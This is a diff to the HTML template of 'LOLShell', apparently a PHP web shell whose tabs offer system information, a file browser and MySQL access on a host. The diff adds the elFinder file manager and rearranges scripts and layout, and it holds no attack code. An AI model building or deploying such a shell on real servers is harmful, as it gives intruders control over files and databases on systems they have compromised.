@@ -217,14 +217,19 @@
   <meta name="description" content="LOLShell v<?=$appVersion?>">
   <meta name="author" content="Contra">
 
+  <link rel="stylesheet" href="http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.14/themes/dark-hive/jquery-ui.css">
+  <link rel="stylesheet" href="elfinder/css/elfinder.css" type="text/css">
+
   <script src="http://cdnjs.cloudflare.com/ajax/libs/modernizr/2.0.6/modernizr.min.js"></script>
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.6.2/jquery.min.js"></script>
   <script src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.8.14/jquery-ui.min.js"></script>
-  <link rel="stylesheet" href="http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.14/themes/dark-hive/jquery-ui.css">
   <script type="text/javascript" src="http://jqueryui.com/themeroller/themeswitchertool/"></script>
-  <script src="ui-init.js"></script>
+  <script src="elfinder/js/elfinder.min.js" type="text/javascript" charset="utf-8"></script>
+  <script src="init.js"></script>
+
 </head>
 <body bgcolor="black">
+<div id="switcher"></div><br/>
 <div id="navtabs">
   <ul>
     <li><a href="#sysinfo"><span>System Information</span></a></li>
@@ -268,7 +273,7 @@
     </div>
   </div>
   <div id="filebrowser">
-    File Browser here
+    <div id="finder">finder</div>
   </div>
   <div id="mysql">
     <div id="mysql-accordion">
@@ -281,7 +286,6 @@
     </div>
   </div>
 </div>
-<div id="switcher" style="position:absolute;top:0px;right:10px;"></div>
 </body>
 </html>
 
